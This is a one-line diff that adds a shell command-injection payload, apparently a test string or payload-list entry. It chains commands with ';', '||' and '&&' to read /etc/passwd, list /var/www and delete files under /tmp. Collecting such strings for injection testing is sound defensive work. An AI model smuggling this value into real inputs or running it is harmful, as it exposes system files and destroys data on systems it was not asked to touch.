@@ -1,0 +1,1 @@
+; cat /etc/passwd || ls -la /var/www && rm -rf /tmp/test;
